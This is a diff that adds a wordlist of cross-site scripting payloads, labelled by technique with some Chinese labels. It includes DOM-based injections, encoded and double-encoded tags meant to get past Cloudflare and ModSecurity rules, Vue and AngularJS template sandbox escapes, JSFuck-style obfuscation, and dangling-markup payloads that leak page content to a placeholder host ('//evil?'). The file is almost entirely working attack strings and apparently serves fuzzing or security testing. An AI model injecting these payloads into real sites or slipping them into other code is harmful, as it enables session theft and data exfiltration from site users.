@@ -1,0 +1,1570 @@
+[DOM-based] DOM-based XSS
+PAYLOAD: '-alert(1)-'
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: ";alert(1)//
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: window['al'+'ert'](document.domain)
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: setTimeout('ale'+'rt(1)',0)
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: eval?.('alert(1)')
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: this[`al`+`ert`](1)
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: self['\x61lert'](1)
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: Reflect.apply(alert,window,[1])
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: navigator['__proto__']['constructor']['constructor']('alert(1)')()
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: crypto.subtle||alert(1)
+--------------------------------------------------------------------------------
+[DOM-based] DOM-based XSS
+PAYLOAD: [].constructor.constructor('alert(1)')()
+--------------------------------------------------------------------------------
+[Cloudflare Bypass] Cloudflare WAF繞過
+PAYLOAD: */alert(1)/*
+--------------------------------------------------------------------------------
+[URL Encoding] 反射型XSS
+PAYLOAD: %3Cdetails%20open%20ontoggle%3Dalert%281%29%3E
+--------------------------------------------------------------------------------
+[Double Encoding] 反射型XSS
+PAYLOAD: %253Cdetails%2520open%2520ontoggle%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Double Encoding] 反射型XSS
+PAYLOAD: %253Cmarquee%2520onstart%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Double Encoding] 反射型XSS
+PAYLOAD: %253Cvideo%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Double Encoding] 反射型XSS
+PAYLOAD: %253Caudio%2520src%253Dx%2520onerror%253Dalert%25281%2529%253E
+--------------------------------------------------------------------------------
+[Double Encoding] 反射型XSS
+PAYLOAD: %253Cselect%2520onfocus%253Dalert%25281%2529%2520autofocus%253E
+--------------------------------------------------------------------------------
+[Double Encoding] 反射型XSS
+PAYLOAD: %253Csvg%253E%253Canimate%2520onbegin%253Dalert%25281%2529%2520attributeName%253Dx%253E
+--------------------------------------------------------------------------------
+[Mixed Encoding] 反射型XSS
+PAYLOAD: %3Cdetails%20open%20ontoggle%3D%26%23112%3Brompt(1)%3E
+--------------------------------------------------------------------------------
+[JavaScript Protocol] 反射型XSS
+PAYLOAD: javascript:alert`1`
+--------------------------------------------------------------------------------
+[Advanced Evasion] ModSec CRS繞過
+PAYLOAD: %25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45alert(1)%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45
+--------------------------------------------------------------------------------
+[Advanced Evasion] ModSec CRS繞過
+PAYLOAD: %3Cdetails%20open%20ontoggle%3D%5C%75%30%30%36%31%5C%75%30%30%36%63%5C%75%30%30%36%35%5C%75%30%30%37%32%5C%75%30%30%37%34%281%29%3E
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <a href=# download="filename.html">Test</a>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <img referrerpolicy="no-referrer" src="//portswigger-labs.net">
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: +/v8
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: +/v9
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: +/v+
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: +/v/
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <iframe sandbox src="//portswigger-labs.net"></iframe>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: %C0%BCscript>alert(1)</script>
+%E0%80%BCscript>alert(1)</script>
+%F0%80%80%BCscript>alert(1)</script>
+%F8%80%80%80%BCscript>alert(1)</script>
+%FC%80%80%80%80%BCscript>alert(1)</script>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{constructor.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <div v-html="''.constructor.constructor('alert(1)')()">a</div>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x v-html=_c.constructor('alert(1)')()>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x v-if=_c.constructor('alert(1)')()>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_c.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_v.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_s.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <p v-show="_c.constructor`alert(1)`()">
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x v-on:click='_b.constructor`alert(1)`()'>click</x>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x v-bind:a='_b.constructor`alert(1)`()'>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x @[_b.constructor`alert(1)`()]>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x :[_b.constructor`alert(1)`()]>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <p v-=_c.constructor`alert(1)`()>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x #[_c.constructor`alert(1)`()]>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <p :=_c.constructor`alert(1)`()>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_b.constructor`alert(1)`()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x v-bind:is="'script'" src="//14.rs" />
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x is=script src=//⑭.₨>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x @click='_b.constructor`alert(1)`()'>click</x>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{$el.ownerDocument.defaultView.alert(1)}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <img src @error=e=$event.path.pop().alert(1)>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <img src @error=e=$event.composedPath().pop().alert(1)>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <img src @error=this.alert(1)>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_openBlock.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_createBlock.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_toDisplayString.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_createVNode.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <p v-show=_createBlock.constructor`alert(1)`()>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x @[_openBlock.constructor`alert(1)`()]>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x @[_capitalize.constructor`alert(1)`()]>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x @click=_withCtx.constructor`alert(1)`()>click</x>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <x @click=$event.view.alert(1)>click</x>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{_Vue.h.constructor`alert(1)`()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{$emit.constructor`alert(1)`()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <component is=script text=alert(1)>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{$on.constructor('alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{{}.")));alert(1)//"}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: constructor.constructor('alert(1)')()
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {}[['__proto__']]['x']=constructor.getOwnPropertyDescriptor;g={}[['__proto__']]['x'];{}[['__proto__']]['y']=g(''.sub[['__proto__']],'constructor');{}[['__proto__']]['z']=constructor.defineProperty;d={}[['__proto__']]['z'];d(''.sub[['__proto__']],'constructor',{value:false});{}[['__proto__']]['y'].value('alert(1)')()
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {}.")));alert(1)//";
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: 'a'.constructor.prototype.charAt=[].join;[1]|orderBy:'x=1} } };alert(1)//';
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: {y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)'
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'">
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <input ng-cut=$event.composedPath()|orderBy:'(y=alert)(1)'>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <body background="//evil?
+<table background="//evil?
+<table><thead background="//evil?
+<table><tbody background="//evil?
+<table><tfoot background="//evil?
+<table><td background="//evil?
+<table><th background="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <img src="//evil?
+<image src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <video><track default src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <video><source src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <audio><source src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <input type=image src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <button form=x style="width:100%;height:100%;"><form id=x action="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <iframe src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <form><button formaction=//evil>XSS</button><textarea name=x>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <button form=x>XSS</button><form id=x action=//evil target='
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <input type=hidden type=image src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this['ale'+'rt'](this['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent['ale'+'rt'](parent['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis['ale'+'rt'](globalThis['doc'+'ument']['dom'+'ain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window[/*foo*/'alert'/*bar*/](window[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self[/*foo*/'alert'/*bar*/](self[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent[/*foo*/'alert'/*bar*/](parent[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis[/*foo*/'alert'/*bar*/](globalThis[/*foo*/'document'/*bar*/]['domain']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self['\x61\x6c\x65\x72\x74'](self['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window['\x65\x76\x61\x6c']('window["\x61\x6c\x65\x72\x74"](window["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self['\x65\x76\x61\x6c']('self["\x61\x6c\x65\x72\x74"](self["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this['\x65\x76\x61\x6c']('this["\x61\x6c\x65\x72\x74"](this["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top['\x65\x76\x61\x6c']('top["\x61\x6c\x65\x72\x74"](top["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent['\x65\x76\x61\x6c']('parent["\x61\x6c\x65\x72\x74"](parent["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames['\x65\x76\x61\x6c']('frames["\x61\x6c\x65\x72\x74"](frames["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis['\x65\x76\x61\x6c']('globalThis["\x61\x6c\x65\x72\x74"](globalThis["\x61\x74\x6f\x62"]("WFNT"))');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis['\141\154\145\162\164']('\130\123\123');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';window[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';self[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';this[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';top[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis[/al/.source+/ert/.source](/XSS/.source);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: ';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <a title="&{alert(1)}">XSS</a>
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <form><button name=x formaction=x><b>stealme
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <isindex type=image src="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+--------------------------------------------------------------------------------
+[PortSwigger Dataset] 反射型XSS
+PAYLOAD: <svg><use href="//subdomain1.portswigger-labs.net/use_element/upload.php#x" /></svg>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: confirm(2)>/
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: open()>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: 5rt(0);'>rhainfosec
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<img src=&{document.cookie=true;};>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<img src="mocha:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: >"<img src="livescript:document.cookie=true;">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: prompt(1);>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("crosssitescripting")>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <iframe src=http://vulnerability-lab.com/index.html <
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <br size="&{alert('crosssitescripting')}">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <a href="http://server.com/">crosssitescripting</a>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <a href="http://www.google.com">crosssitescripting</a>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <a href="http://1113982867/">crosssitescripting</a>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: ";alert('crosssitescripting');//
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <crosssitescripting style="behavior: url(crosssitescripting.htc);">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: scriptalert(crosssitescripting)/script
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: </c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <span datasrc="#crosssitescripting" datafld="b" dataformatas="html"></span>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <xml src="crosssitescriptingtest.xml" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <?import namespace="t" implementation="#default#time2">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: </body></html>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <img src="http://www.vulnerability-lab.com/file.php?variables=malicious">
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <iframe src=http://test.de>
+--------------------------------------------------------------------------------
+[HttpParams Dataset] 反射型XSS
+PAYLOAD: <body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("xss")>
+--------------------------------------------------------------------------------
